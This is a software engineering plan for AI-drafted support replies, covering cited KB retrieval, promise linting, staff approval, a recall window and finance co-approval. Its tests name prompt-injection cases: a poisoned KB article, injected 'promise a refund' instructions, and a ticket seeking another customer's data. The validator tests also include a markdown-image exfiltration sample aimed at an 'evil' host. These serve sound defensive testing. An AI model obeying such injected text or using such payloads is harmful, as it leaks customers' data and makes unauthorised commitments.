# Slice 12: Reply drafting with citations, approval, recall and finance co-approval

- **Goal:** a support agent asks for a draft on a triaged ticket; the system retrieves published KB passages (PostgreSQL full-text, French and English), asks the model for a cited draft, verifies the citations in application code, stores it as a `ticket_messages` row with `author_type = 'ai_draft'`, and lets the agent edit, reject or approve it. Approval re-runs every validator on the final text, holds the message for a 30-second recall window, and a money-affecting draft additionally needs a finance co-approval (an `approvals` action, D-50). Sending goes through `notifications`. No code path sends AI text without a staff approval.
- **Depends on:** slice 11 (`AiService`, budgets, audit, `FakeLLMClient`, `TriageOutput`), slice 10 (tickets, messages, KB versions, `kb_current_versions`, `domain/kb.py` lint), slice 7 (`NotificationService`, sender), slice 5 (outbox `available_at`, job queue), slice 1 (`ApprovalService`, step-up, `finance_lead` attribute).
- **Requirements served:** FR-10, FR-16 (AI output language), FR-17 (retrieval side: unpublished and archived articles are never cited), NFR-08 (human gate), NFR-13 (regeneration cap).
- **Size:** L, 9 days.
- **Companion files:** [fe-12-drafts.md](frontend/fe-12-drafts.md) (draft panel, citations side panel, approve and recall controls, finance co-approval view).
- **Spikes or open items:** (1) **Golden-set gates (docs/06 section 7.2):** citation validity 100% (enforced by the validator), raw quote verbatim match at least 97%, forbidden-promise rate 0 of 150 on `draft_trap` after the lint, wrong-language rate at most 0.5%, rubric mean at least 4.0; the harness is Task 12.7, the live run is the nightly and pre-release job. (2) **[open]** language of drafts for `sw`, `ln`, `other` tickets: default `en` as the setting `DRAFT_DEFAULT_LANGUAGE` (PRD AC-FR-10-1). (3) **[open]** customer-facing wording that staff may use AI to prepare replies (legal); no AI attribution is added to messages. (4) **[open]** minimum retrieval rank `KB_MIN_RANK`, default 0.05. (5) **[open]** URL allowlist `DRAFT_URL_ALLOWLIST`, default empty (no URL allowed). (6) The D-24 ask-the-data latency spike is slice 13.

## Read first

- `docs/06-ai-integration.md#3.2 FR-10 Draft reply` (the whole section: retrieval, verified facts, language rules, forbidden promises, `draft.v1` schema, validators 1 to 7, approval, recall)
- `docs/06-ai-integration.md#4. Prompt architecture` (4.1 layout, 4.2 content, 4.3 isolation)
- `docs/06-ai-integration.md#5.2 Per-feature choices` (draft effort `medium`) and `#6.4 Budgets` (regeneration 3, draft pool $25)
- `docs/06-ai-integration.md#8.1 Abuse cases, controls and tests` (A-1, A-2, A-5, A-7)
- `docs/03-code-architecture.md#6.4 Ticket AI pipeline` steps 3 to 6, `#2.8 support`, `#2.11 notifications`, `#2.14 Approvals` (row `draft.money_affecting`)
- `docs/01-prd.md` AC-FR-10-1 to AC-FR-10-7, AC-FR-16-3, AC-FR-17-3, AC-FR-17-4
- `docs/07-security-threat-model.md` T-10, T-11, T-12, T-13, T-14
- `docs/10-test-strategy.md#2.8 Prompt-injection regression suite` and `#2.10` rows "Drafts" and "KB publication"
- `db/schema.sql` lines 1481 to 1517 (`ticket_messages` and its CHECK constraints), 1558 to 1625 (KB), 1699 to 1725 (`outbox`), 387 to 420 (`approvals`)
- `docs/00-shared-context.md` section 7: D-35, D-36, D-50
- `docs/plan/slice-11-ai-gateway-triage.md` section Interfaces (the gateway surface used here)
- OperationIds: `requestReplyDraft`, `listTicketDrafts`, `getDraft`, `editDraft`, `approveDraft`, `coApproveDraft`, `getDraftMoneyClaims`, `rejectDraft`, `recallDraft`.

## Global constraints

- Drafts only on a staff request, only for a triaged ticket with a linked customer, regeneration at most 3 per ticket; the effort for `reply_draft` is `medium`, `max_tokens` 12,000 (ceiling 24,000), prompt cache on, schema `draft.v1` exactly as docs/06 section 3.2.
- A draft is a `ticket_messages` row: `author_type='ai_draft'`, `direction='outbound'`, status values only `draft, approved, sent, rejected, recalled`; the schema CHECKs `ck_ticket_messages_ai_approval`, `ck_ticket_messages_money` and `ck_ticket_messages_recalled` must never be sidestepped (no separate drafts table that can be sent).
- Citations are application-level: every `passage_id` must be in the retrieved set sent in this request; every `quote` must appear verbatim in its passage after NFKC, accent-folding and whitespace normalisation; at least one citation unless `escalate_to_human`. The Anthropic citations feature is not used (incompatible with `output_config.format`).
- Reply language `en` or `fr` only and equal to the required language; a language check on the body must agree; for `sw`, `ln`, `other` tickets the draft is in `DRAFT_DEFAULT_LANGUAGE`, offers a call-back in one sentence, and the staff screen shows the translator warning.
- Forbidden promises (refund, credit, reversal, compensation, discount; any time to restore, repair, reconnect or visit not found in a retrieved passage; outcome of an investigation; tariff change or exception; legal statement; admission of fault; safety assurance; balances or amounts not supplied as verified facts; anything about other customers) are linted in EN and FR, including amounts and durations that appear in retrieved passages (D-36).
- Approval requires permission `ticket.ai_approve`, step-up within 300 seconds, and an `Idempotency-Key`; validators re-run on the final text, never on the stored draft; the approver is the authenticated user.
- Recall window 30 seconds: outbox `available_at = approval time + 30 s` (for a money-affecting draft, the time of the co-approval); `POST /drafts/{id}/recall` before `recall_until` sets `recalled`; afterwards 409 `recall_window_closed`.
- A money-affecting draft needs a co-approval by a `finance_officer` holding the `finance_lead` attribute, different from the approving agent (user and session); the approval action is `draft.money_affecting`; the co-approver sees only the money claims, never the conversation or customer identity.
- Outbox rows for AI replies carry `customer_facing = true`, `ai_derived = true` and `approval_ref = <ticket_messages.id>` (schema CHECK `ck_outbox_ai_approval`). The gateway role cannot write messages or outbox rows.
- Rendering: drafts, `reviewer_notes` and citations are plain text; markdown images and external links are stripped or flagged; no HTML from the model.
- Only OpenAPI operations above; roles from `api/permissions.yaml`; the administrator has no draft access (D-14).

## Review focus

1. **Edit at approval adds a promise.** The agent approves a clean draft but supplies a `body` containing "we will refund 20 USD within 24 hours": the lints must run on that text, set `money_affecting`, require the co-approval, and a non-money promise ("within 24 hours" alone) must return 422 `draft_lint_failed`. Pinned by `test_edit_at_approval_reruns_lints_on_final_text` (Task 12.6), owned by 12.6.
2. **Recall at exactly 29 s and 31 s.** The send path must not pick the outbox row before `available_at`, recall at 29 s wins, at 31 s returns 409 and the message is sent. Pinned by `test_recall_window_boundaries` (Task 12.6).
3. **Poisoned or archived KB passage.** An article saying "refunds within 24 hours", an archived article, and an unpublished draft version must never be cited or sent to the model. Pinned by `test_retrieval_excludes_unpublished_and_archived` (12.2) and `test_poisoned_passage_amount_is_linted` (12.4).
4. **Hidden-instruction ticket asking for another customer's data.** The canary string planted on a second customer must appear in no prompt, draft or log. Pinned by `test_canary_of_other_customer_never_in_prompt_or_draft` (12.4).
5. **Two approvers racing.** Two agents approving the same draft at once, or the co-approval arriving before the agent's approval: exactly one effect, the other gets 409. Pinned by `test_concurrent_approvals_single_send` and `test_co_approval_before_agent_approval_refused` (12.6).

## Files

Migration `db/migrations/NNNN_reply_drafting.sql` (next unused number; record in `docs/plan/progress.md`):
- Extend `ck_approvals_action` with `'draft.money_affecting'` (the frozen schema list lacks it; D-50 extends D-15). Drop and re-add the constraint with the full previous list plus the new value.
- Table `hub.draft_details (message_id uuid primary key references hub.ticket_messages(id), ticket_id uuid not null, source_message_id uuid not null, generation_status text not null check in ('generating','ready','failed','refused','superseded'), original_body text, original_body_sha256 char(64), approved_text_sha256 char(64), lint_findings jsonb not null default '[]', money_claims jsonb not null default '[]', unverified boolean not null default false, needs_edit boolean not null default false, translator_warning boolean not null default false, source_in_other_language boolean not null default false, reviewer_notes jsonb, confidence numeric(4,3), edit_distance integer, rejection_reason text, rejection_note text, recall_until timestamptz, version integer not null default 1, created_at timestamptz not null default now(), unique (ticket_id, source_message_id, version))`; grants SELECT, INSERT, UPDATE to `hub_api` and `hub_worker`; `GRANT INSERT ON hub.ticket_message_citations TO hub_worker`.
- Trigger `hub.ticket_messages_body_guard` BEFORE UPDATE on `ticket_messages`: if `OLD.status IN ('approved','sent')` and `NEW.body IS DISTINCT FROM OLD.body` raise `restrict_violation` (threat T-14: text hash cannot change after approval).
- Function `hub.release_money_draft(p_message uuid, p_approval uuid, p_finance_user uuid, p_text_sha char(64))` `SECURITY DEFINER`, owned by `migrator`, `search_path = pg_catalog, hub, pg_temp`, `EXECUTE` to `hub_api` only: verifies the message is a `draft` with `money_affecting`, `approved_by` not null and different from `p_finance_user`, the approval is `approved` for action `draft.money_affecting` and its payload hash matches `p_text_sha`; sets `finance_approver`, `status='approved'`. Needed because finance officers see no tickets under row-level security.

Backend (`backend/src/hub/support/` unless stated):
- `contracts.py` (extend): `DraftView`, `KbPassage`, `RetrievedSet`, `VerifiedFact`, `ReplyBodyProvider`, `SupportService.request_draft/edit_draft/approve_draft/co_approve_draft/recall_draft/reject_draft/search_kb`.
- `events.py` (extend): `DraftCreated`, `DraftApproved`, `DraftRejected`, `DraftRecalled`.
- `domain/promise_lint.py` (bilingual pattern lists and `find_promises(text, lang)`; slice 10's `domain/kb.py` is changed to call it and its tests stay green), `domain/draft_validators.py`, `domain/langcheck.py` (stopword-ratio detector for `en` and `fr`, pure Python), `domain/leak_scan.py`, `domain/money_claims.py`, `domain/citations.py` (normalisation and verbatim check), `domain/draft_state.py` (state machine).
- `application/request_draft.py`, `generate_draft.py` (worker job `support.generate_draft`), `edit_draft.py`, `approve_draft.py`, `co_approve_draft.py` (also the `ApprovalExecutor` for `draft.money_affecting`), `recall_draft.py`, `reject_draft.py`, `reply_body_provider.py`, `retrieval.py`, `wiring.py` (modify).
- `application/ports.py`: `VerifiedFactsProvider` (default empty adapter in `infrastructure/facts_empty.py`; the real adapter is `backend/src/hub/integration/support_facts.py`, a composition module outside the module DAG).
- `infrastructure/kb_search.py` (raw SQL), `models.py` (add `DraftDetails`), `repositories.py` (modify).
- `api/draft_serializers.py`, `api/draft_views.py`, `api/urls.py` (modify).
- `backend/src/hub/ai_gateway/prompts/reply_draft/v1/{system.md,fewshots.jsonl,schema.json,meta.yaml}` and `ai_gateway/application/core_kb_pack.py` (renders the pack from KB articles tagged `core`, sorted by id, content-hashed).
- Settings: `DRAFT_DEFAULT_LANGUAGE`, `KB_MIN_RANK`, `DRAFT_URL_ALLOWLIST`, `DRAFT_RECALL_SECONDS=30`, `DRAFT_MAX_REGENERATIONS=3`.
- Tests: `backend/tests/unit/support/draft/`, `backend/tests/integration/support/draft/`, `backend/tests/security/support/draft/`, `backend/tests/ai/eval/draft/`, fixtures `backend/tests/ai/fixtures/draft_gold_mini.jsonl`, `draft_trap_mini.jsonl`.

## Interfaces

**Consumes:** `ai_gateway.contracts.AiService.run(AiRequest)` with `feature="reply_draft"`, `sync=True`, `deadline=15 s`, output model `DraftModel`; `identity.contracts.ApprovalService.propose/approve`, `Principal`, step-up check; `shared.contracts.ApprovalExecutor`; `notifications.contracts.NotificationService.request(NotificationRequest, uow=)`, where `NotificationRequest` carries `customer_id, channel, template, locale, params, dedupe_key, available_at, ai_derived: bool, approval_ref: UUID | None` (if slice 7 lacks the last three fields, add them there; see Plan notes); `customers.contracts.CustomerDirectory.preferred_channel(customer_id)`; `shared.ports.Clock, IdGenerator`; job queue `JobQueue.enqueue`.

**Produces:**

```python
class ReplyBodyProvider(Protocol):          # called by the notifications sender (template "ticket_reply")
    def body_for_send(self, message_id: UUID) -> SendableReply | None: ...   # None unless sendable now
    def mark_sent(self, message_id: UUID, notification_id: UUID) -> None: ...
# sendable = human message, or ai_draft with status 'approved', approved_by set, recalled_at NULL, and (if money_affecting) finance_approver set

@dataclass(frozen=True, slots=True)
class KbPassage:
    passage_id: str            # "p1".."p5", per request
    kb_version_id: UUID; article_id: UUID; version_no: int; language: Literal["en","fr"]
    title: str; text: str; rank: float

@dataclass(frozen=True, slots=True)
class DraftValidation:
    ok: bool; invalid_reasons: tuple[str, ...]          # stop: status invalid, no draft shown
    lint_findings: tuple[str, ...]                      # shown to staff
    needs_edit: bool; money_affecting: bool; money_claims: tuple[MoneyClaim, ...]; unverified: bool

def validate_draft(model: DraftModelValue, passages: Sequence[KbPassage], required_language: str,
                   placeholders: Mapping[str, str]) -> DraftValidation: ...        # domain, pure
def validate_final_text(text: str, language: str, placeholders: Mapping[str, str]) -> DraftValidation: ...
```

Events: `draft.created {message_id, ticket_id, ai_run_id, citation_ids[], money_affecting}`; `draft.approved {message_id, ticket_id, approved_by, edited, channel, locale, send_not_before}`; `draft.recalled {message_id, ticket_id, recalled_by}`; `draft.rejected {message_id, ticket_id, rejected_by, reason}`. Approval action `draft.money_affecting` with payload `{message_id, text_sha256, money_claims}`.

Serializers: `DraftRequestSerializer`, `DraftSerializer`, `DraftEditSerializer`, `DraftApproveSerializer`, `DraftCoApproveSerializer`, `DraftMoneyClaimsSerializer`, `DraftRejectSerializer`, `DraftRecallSerializer`. Problem codes used: `draft_lint_failed` (422), `money_co_approval_required` (409), `recall_window_closed` (409), `triage_required` (409), `customer_required` (409), `no_kb_match` (409), `regeneration_limit` (429).

JSON schemas: `draft.v1` as in docs/06 section 3.2 (properties `reply_language`, `draft{subject,body}`, `citations[{passage_id,quote,supports}]`, `reviewer_notes{kb_basis,assumptions,missing_information,escalate_to_human,escalation_reason}`, `confidence`, `money_affecting`; all required, `additionalProperties: false` at every level).

## Tasks

### Task 12.1: Migration, models and approval action

- [ ] 1. Failing tests `backend/tests/integration/support/draft/test_schema_drafts.py`: `test_approval_action_draft_money_affecting_allowed` (insert an approval with the new action succeeds; unknown action fails), `test_body_cannot_change_after_approval` (UPDATE body of an `approved` AI draft raises `restrict_violation`; status change to `recalled` works), `test_ai_draft_cannot_be_approved_without_approver` (CHECK `ck_ticket_messages_ai_approval`), `test_money_draft_cannot_be_approved_without_finance_approver` (CHECK `ck_ticket_messages_money`), `test_release_money_draft_function_rules` (same user as `approved_by` refused; wrong hash refused; correct call sets `finance_approver` and `approved`; callable by `hub_api`, not by `hub_ingest`), `test_models_match_database`.
- [ ] 2. Run `cd backend && uv run pytest tests/integration/support/draft/test_schema_drafts.py -q`; expected: constraint violations missing, function does not exist.
- [ ] 3. Implement the migration and the unmanaged `DraftDetails` model; Django `RunSQL` wrapper in `hub/shared/migrations/`.
- [ ] 4. Re-run until green; run `make contracts`.
- [ ] 5. Commit: `feat(support): draft details, money co-approval action and body guard migration`.

### Task 12.2: KB retrieval in French and English

- [ ] 1. Failing tests `backend/tests/integration/support/draft/test_retrieval.py`: `test_french_query_finds_french_article_with_stemming` ("rechargement" finds "recharger"), `test_english_query_finds_english_article`, `test_other_language_retry_when_fewer_than_two_pass_min_rank` (EN ticket, FR-only article: found with `source_in_other_language=True`, AC-FR-17-4), `test_retrieval_excludes_unpublished_and_archived` (draft version, never-approved version, archived article: absent; archive effective within one query, AC-FR-17-3), `test_top5_deterministic_order_rank_then_article_id` (two runs byte-identical), `test_passages_cut_on_paragraph_boundaries_max_1200_chars`, `test_no_match_returns_empty_set`, `test_latest_published_version_only` (older superseded version never returned), `test_query_built_from_redacted_text` (a phone number in the subject never reaches the SQL parameters).
- [ ] 2. Run `uv run pytest tests/integration/support/draft/test_retrieval.py -q`; expected: `search_kb` not implemented.
- [ ] 3. Implement `infrastructure/kb_search.py` with parameterised raw SQL over `hub.kb_current_versions`: per language configuration run `websearch_to_tsquery('french', :q)` against rows with `language='fr'` and `websearch_to_tsquery('english', :q)` against rows with `language='en'` (the stored `search` vector uses the configuration of each row's language, so the query configuration must match the row language; a constant tsquery per statement keeps the GIN index usable), rank with `ts_rank_cd`, keep rank at or above `KB_MIN_RANK`, then for each of the top 5 articles pick the best-ranking paragraph (split on blank lines, rank each paragraph) and cut to 1,200 characters at a paragraph boundary; order by rank descending then article id; assign `passage_id` `p1` to `p5`. The primary configuration is the ticket language (`fr`, or `en` for `en`, `sw`, `ln`, `other`); if fewer than 2 rows pass, repeat with the other configuration and merge.
- [ ] 4. Re-run until green.
- [ ] 5. Commit: `feat(support): bilingual full-text KB retrieval of published passages`.

### Task 12.3: Draft validators, language check and promise lint

- [ ] 1. Failing tests `backend/tests/unit/support/draft/test_validators.py`: `test_unknown_passage_id_rejected` (TC-FR-10-4), `test_quote_must_be_verbatim_after_normalisation` (accents, NBSP and double spaces tolerated; a changed word rejected), `test_no_citation_rejected_unless_escalate`, `test_reply_language_must_match_required_and_body_language` (French body with `reply_language: en` invalid), `test_langcheck_en_fr_fixtures` (30 sentences each), `test_forbidden_promise_lint_en_fr` (parametrised: "we will refund", "within 24 hours", "guarantee", "nous vous rembourserons", "sous 48 heures", "nous garantissons", "il est sans danger de toucher le compteur"), `test_amount_from_retrieved_passage_still_flagged` (D-36: passage says "5 USD", draft repeats it: finding), `test_money_claim_detection_sets_money_affecting` (refund, credit, waiver, any currency amount), `test_leak_scan_blocks_email_phone_id_and_unlisted_url` (TC-FR-10-3), `test_markdown_image_and_external_link_stripped_or_flagged` (`![x](https://evil/?d=...)`), `test_placeholders_must_belong_to_this_ticket_map`, `test_plain_paragraphs_only_length_bounds`, `test_other_customer_canary_not_representable` (placeholders not in the map are findings).
- [ ] 2. Run `uv run pytest tests/unit/support/draft/test_validators.py -q`; expected: modules missing.
- [ ] 3. Implement the pure-domain modules. `validate_draft` returns `invalid_reasons` for checks 1, 2, 3, 4, 6, 7 of docs/06 section 3.2 (no draft shown) and `lint_findings` plus `needs_edit` for check 5 (a promise hit is shown to staff and approval is refused until the text passes or, for money wording, the co-approval path is taken); `money_affecting` is true when the model sets it or `find_money_claims` finds a money, refund, credit, tariff or amount phrase. Move the pattern lists to `promise_lint.py` and make slice 10's KB lint call it.
- [ ] 4. Re-run until green, then `uv run pytest tests/unit/support -q` (slice 10 tests stay green).
- [ ] 5. Commit: `feat(support): draft validators, language check and bilingual promise lint`.

### Task 12.4: Draft request and generation

- [ ] 1. Failing tests: `tests/integration/support/draft/test_generate.py`: `test_request_requires_triaged_ticket_and_customer` (409 `triage_required`, 409 `customer_required`), `test_no_kb_match_no_model_call_and_manual_path` (409 `no_kb_match`, fake saw zero requests), `test_generates_cited_draft_message` (row `author_type='ai_draft'`, `direction='outbound'`, `status='draft'`, `ai_run_id` set, citation rows for the cited `kb_version_id`s, `draft.created` outbox, `generation_status='ready'`, body contains placeholders rehydrated only at read time), `test_invalid_citation_leaves_no_draft` (status `failed`, row marked `failed`, nothing shown), `test_refusal_sets_refused_no_retry`, `test_regeneration_cap_3_then_429`, `test_new_draft_supersedes_previous_draft`, `test_sw_ln_other_default_language_and_translator_warning` (AC-FR-10-1), `test_en_ticket_fr_only_source_flag`, `test_prompt_contains_only_this_ticket_and_published_passages` (inspect the fake's request), `test_canary_of_other_customer_never_in_prompt_or_draft`, `test_poisoned_passage_amount_is_linted` (published article "refund within 24 hours": fake model repeats it: finding and `needs_edit`, TC-FR-17-5 data), `test_injected_instruction_in_ticket_and_in_passage_does_not_authorise_promise` (fake obeys "promise a refund": lint hits, `money_affecting` true, stays `draft`, TC-FR-10-2 and TC-FR-17-2), `test_draft_p95_budget_deadline_15s`. Plus `tests/security/support/draft/test_no_send_path.py::test_no_state_transition_sends_without_approval` (property test over every legal and illegal transition of `draft_state`: reaching `approved` or `sent` without `approved_by` and, for money drafts, `finance_approver` is impossible, TC-FR-10-1).
- [ ] 2. Run `uv run pytest tests/integration/support/draft/test_generate.py tests/security/support/draft -q`; expected: 404 route.
- [ ] 3. Implement `request_draft` (validates triage and customer, enforces the cap by counting `reply_draft` runs for the ticket, inserts the placeholder message with empty body and `generation_status='generating'`, enqueues `support.generate_draft`, returns 202 with the `Draft` view), `generate_draft` (worker job: `retrieval`, verified facts, `AiService.run(feature="reply_draft", sync=True)`, `validate_draft`, one transaction that fills `body` with the redacted-text draft, `ai_run_id`, `draft_details`, citations, supersedes older drafts, outbox `draft.created`; on `refused`, `truncated`, `invalid`, `error`, `budget_blocked` sets the matching `generation_status` and the reason for the staff notice), and `core_kb_pack` plus the `reply_draft@v1` prompt (system rules for tone, forbidden promises, instruction hierarchy, the language rule through the operator message). Placeholder rehydration happens in the serializer layer from the encrypted map, never in a prompt.
- [ ] 4. Re-run until green.
- [ ] 5. Commit: `feat(support): staff-requested cited reply drafts stored as ai_draft messages`.

### Task 12.5: Read, edit, reject and the money-claims view

- [ ] 1. Failing tests `tests/integration/support/draft/test_edit_reject.py`: `test_get_and_list_drafts_site_scoped`, `test_edit_reruns_lints_and_422_on_blocking_finding` (`draft_lint_failed` with `lint_findings`), `test_edit_with_money_phrase_sets_money_affecting_not_422`, `test_edit_bumps_version_and_marks_edited`, `test_edit_of_approved_draft_409`, `test_reject_requires_enum_reason_and_records_note` (outbox `draft.rejected`; worker handler sets `ai_runs.human_decision='rejected'`), `test_money_claims_view_exposes_only_claims` (finance officer with `finance_lead` receives `draft_id`, `ticket_number`, `money_claims`; no body, no customer id; support agent also allowed per permissions; administrator 403), `test_administrator_denied_everywhere`.
- [ ] 2. Run `uv run pytest tests/integration/support/draft/test_edit_reject.py -q`; expected: 404.
- [ ] 3. Implement the use cases and views. `edit_draft` writes `body`, recomputes `lint_findings`, `money_claims`, `money_affecting`, `unverified` (heuristic default: edit distance ratio over 0.3 or digits not present in the original, a setting `[open]`), bumps `version`. Rejection stores `rejection_reason` and `rejection_note`.
- [ ] 4. Re-run until green.
- [ ] 5. Commit: `feat(support): edit, reject and finance money-claims view for drafts`.

### Task 12.6: Approval, recall window, finance co-approval and sending

- [ ] 1. Failing tests `tests/integration/support/draft/test_approval.py`: `test_approve_requires_permission_stepup_and_idempotency_key` (no step-up gives 401 `step_up_required`; replay with the same key returns the same body), `test_approve_non_money_sets_approved_and_holds_30s` (outbox row with `available_at == approved_at + 30 s`, `customer_facing` and `ai_derived` true, `approval_ref` equal to the message id, `recall_until` returned, `draft.approved` event), `test_edit_at_approval_reruns_lints_on_final_text` (Review focus 1), `test_approve_money_affecting_returns_409_and_creates_approval` (state: `approved_by` set, status still `draft`, no outbox row, one `approvals` row action `draft.money_affecting` whose `payload_hash` covers `{message_id, text_sha256, money_claims}`), `test_co_approve_releases_with_30s_hold` (finance officer with `finance_lead`; `finance_approver` set, status `approved`, outbox `available_at` is co-approval time + 30 s), `test_co_approver_cannot_be_the_approving_agent` (user and session), `test_co_approve_with_stale_payload_hash_refused` (text changed after the approval was proposed), `test_co_approval_before_agent_approval_refused`, `test_co_approve_requires_finance_lead_attribute_and_stepup`, `test_concurrent_approvals_single_send` (two threads: one 200, one 409, one outbox row), `test_recall_window_boundaries` (FrozenClock 29 s: 200 and `recalled`; 31 s: 409 `recall_window_closed`; only the approving agent may recall, others 403), `test_recalled_message_never_sent` (the sender harness calls `body_for_send` and gets `None`), `test_sender_harness_marks_sent_after_window` (the relay does not claim the row before `available_at`; after the window `body_for_send` returns the final text and `mark_sent` sets `sent`), `test_audit_trail_after_send` (original draft, final text hash, edit distance, approver, timestamps retrievable, AC-FR-10-5; an `audit_append` entry per approval and co-approval).
- [ ] 2. Run `uv run pytest tests/integration/support/draft/test_approval.py -q`; expected: 404 routes.
- [ ] 3. Implement `approve_draft` in one `with uow:`: lock the message `FOR UPDATE`; reject unless `status='draft'` and `ai_draft`; take `final_text = request.body or stored body`; `validate_final_text`; blocking findings give 422 `draft_lint_failed`; set `approved_by`, `approved_at`, `body = final_text`, `approved_text_sha256`, `edit_distance` (Levenshtein, normalised to the original body). If money-affecting: set `money_affecting=true`, call `ApprovalService.propose(action="draft.money_affecting", payload=..., subject_customer_id=<ticket customer>, maker=approver)`, commit, and return the outcome that the view maps to 409 `money_co_approval_required` with `approval_id` and `payload_hash` in the details. Otherwise set `status='approved'`, `recall_until = now + DRAFT_RECALL_SECONDS`, call `NotificationService.request(template="ticket_reply", params={"message_id": ...}, dedupe_key=f"draft:{message_id}", available_at=recall_until, ai_derived=True, approval_ref=message_id)`, emit `draft.approved`. `coApproveDraft` calls `ApprovalService.approve` and the executor `DraftMoneyAffectingExecutor(action="draft.money_affecting")`, which calls `hub.release_money_draft` through `shared.db.call_function`, then requests the notification with `available_at = now + 30 s` and updates `recall_until`; the stored payload is used, never the client's. `recall_draft` sets `status='recalled'`, `recalled_at` and emits `draft.recalled`; the sender never reads a body except through `ReplyBodyProvider`, whose `body_for_send` returns `None` unless the message is sendable. A worker handler on `draft.approved` and `draft.rejected` sets `ai_runs.human_decision` (`approved` or `edited`, `rejected`) with reviewer and time.
- [ ] 4. Re-run until green; run `make contracts`.
- [ ] 5. Commit: `feat(support): approve, recall and finance co-approval of AI drafts`.

### Task 12.7: Evaluation harness for drafts and language, metrics

- [ ] 1. Failing tests `tests/ai/eval/draft/test_draft_eval.py`: `test_draft_metrics_from_fixture` (citation validity 100% programmatic, raw quote match rate, forbidden-promise rate on `draft_trap_mini.jsonl` after lint equals 0, wrong-language rate, leak-scan failures 0), `test_trap_set_contains_refund_eta_exception_safety_other_customer_and_poisoned_passage_cases`, `test_wrong_language_detected_and_counted` (TC-FR-16-2: fake returns a French body for an English requirement; counted in `soleil_ai_wrong_language_total`, draft invalid), `test_eval_run_uses_no_fallbacks`, `test_report_fields` (prompt id, model, effort, served model, usage, cost per case, reviewer-attentiveness field left empty), `tests/unit/support/draft/test_metrics.py::test_draft_metrics_registered` (`soleil_draft_decisions_total{approved_unchanged,approved_edited,rejected,discarded}`, `soleil_draft_edit_distance`).
- [ ] 2. Run `uv run pytest tests/ai/eval/draft tests/unit/support/draft/test_metrics.py -q`; expected: fixtures missing.
- [ ] 3. Implement `draft_gold_mini.jsonl` (20 bilingual cases with labelled passages) and `draft_trap_mini.jsonl` (20 trap cases), the draft branch of `run_ai_eval`, and the two metrics. The live-model run with the full 200 and 150 case sets is a nightly job and pre-release gate.
- [ ] 4. Re-run until green.
- [ ] 5. Commit: `test(ai): draft evaluation harness, trap set and language metrics`.

### Task 12.8: Conformance and end-to-end

- [ ] 1. Failing tests: `tests/contract/test_openapi_drafts.py::test_schemathesis_draft_operations` (the nine operationIds), `tests/e2e/test_draft_flow.py::test_agent_reviews_edits_approves_and_sends_french_draft` (French ticket, triage by the fake, draft with citations, edit, approve with step-up, wait out the hold, message `sent`, audit visible), `test_money_draft_needs_finance_and_recall` and `tests/architecture/test_no_ai_to_notifications_path.py::test_ai_gateway_does_not_import_notifications_or_write_messages` (import-linter plus a grep that no `INSERT INTO ticket_messages` or `outbox` string exists under `hub/ai_gateway`).
- [ ] 2. Run `uv run pytest tests/contract/test_openapi_drafts.py tests/e2e/test_draft_flow.py tests/architecture/test_no_ai_to_notifications_path.py -q`; expected: serializer mismatches.
- [ ] 3. Fix mismatches in serializers only; extend `load_fixtures` with a published bilingual core KB pack, a finance officer with `finance_lead`, and a poisoned article in a draft (unpublished) version.
- [ ] 4. Re-run until green; `make lint`.
- [ ] 5. Commit: `test(support): conformance and end-to-end draft approval flow`.

## Verification

`make verify SLICE=12` runs from the repository root:

1. `make lint`: clean.
2. `make contracts`: green.
3. `cd backend && uv run pytest tests/unit/support tests/integration/support -q`: all pass (slice 10 and 11 tests included).
4. `cd backend && uv run pytest tests/security/support/draft tests/security/ai -q`: all pass.
5. `cd backend && uv run pytest tests/ai/eval -q`: harness, mini sets and thresholds pass.
6. `cd backend && uv run pytest tests/contract/test_openapi_drafts.py tests/architecture -q`: no violations.
7. `cd backend && uv run pytest tests/e2e/test_draft_flow.py -q`: pass.

## Demo script

1. `make up`, fixtures with the fake adapter and the bilingual core KB. Open a French ticket (triage runs). As an agent `POST /tickets/{id}/drafts` with `{"locale":"fr"}`. Observe 202, then `generation_status` `ready` with 1 to 3 citations that name article id and version.
2. Edit the draft to add "nous vous rembourserons 5 USD": observe `money_affecting` true. Approve: 409 `money_co_approval_required`; nothing in the outbox.
3. As the finance officer (with `finance_lead`, fresh step-up) open the money-claims view (only claims), co-approve with the `payload_hash`: status `approved`, `recall_until` 30 s ahead.
4. Recall within 30 s: `recalled`, nothing sent. Repeat and wait 31 s: the stub SMS or email contains the final text only, message `sent`.
5. Try approving as the same agent twice, with a stale hash, and with no step-up: each refused as specified.

## Done criteria

Requirements covered: FR-10, FR-16 (AI output language), FR-17 retrieval side, NFR-08. Test cases implemented and passing: TC-FR-10-1 (12.4), TC-FR-10-2 (12.4), TC-FR-10-3 (12.3), TC-FR-10-4 (12.3, 12.4), TC-FR-10-5 (12.7 harness; live gate nightly), TC-FR-10-6 (12.8), TC-FR-10-7 (12.6), TC-FR-10-8 (12.6), TC-FR-17-2 (12.4), TC-FR-16-2 (12.7).

## Plan notes for the tech lead

1. **Approval action list.** `db/schema.sql` `ck_approvals_action` has no `draft.money_affecting`, while D-50 and docs/03 2.14 add it. Followed D-50 through a migration (the executor guide allows new numbered migrations).
2. **Permission name for the co-approval.** docs/03 2.14 says approver permission `ticket.money_approve`; neither the schema seed nor `api/permissions.yaml` nor the OpenAPI has it (the operation uses role `finance_officer` plus attribute `finance_lead`). Followed the OpenAPI and permissions file.
3. **Row-level security hides tickets from finance.** The co-approval updates a ticket message that the finance officer cannot see under `FORCE`d RLS. Followed: a `SECURITY DEFINER` function owned by `migrator` (a system-policy role) with pinned `search_path` and explicit checks.
4. **`hub_api` cannot update the outbox.** docs/03 and D-35 say recall "cancels the outbox row", but `hub_api` has INSERT only on `outbox`. Followed: recall changes the message status and the sender re-checks sendability through `ReplyBodyProvider.body_for_send`; the outbox row is consumed as a no-op.
5. **Draft generation placement.** docs/06 runs interactive drafts in `hub-api`; the OpenAPI marks `requestReplyDraft` asynchronous and `hub_api` has no INSERT on `ticket_message_citations` for the worker role. Followed the OpenAPI: a worker job calls the gateway with `sync=True` (so pinned fallbacks apply), with grants added by the migration.
6. **Validator outcomes.** docs/06 says every validator failure means `invalid`, yet the same section says a forbidden-promise hit yields a visible `needs_edit` draft. Followed the second reading: checks 1 to 4, 6 and 7 hide the draft; check 5 shows it with findings. The OpenAPI has no field for an approver's "recorded reason", so no override of a promise finding exists; money wording goes through co-approval.
